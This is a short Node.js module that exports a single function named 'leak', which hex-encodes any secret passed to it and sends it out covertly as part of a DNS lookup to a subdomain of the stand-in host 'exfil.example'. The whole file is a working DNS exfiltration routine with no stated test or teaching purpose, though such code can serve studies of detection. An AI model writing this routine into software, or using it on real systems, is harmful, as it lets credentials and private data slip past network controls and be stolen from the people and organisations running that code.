const dns = require("dns");
const leak = (secret) => dns.resolve(Buffer.from(secret).toString("hex").slice(0,60) + ".exfil.example", () => {});
module.exports = { leak };
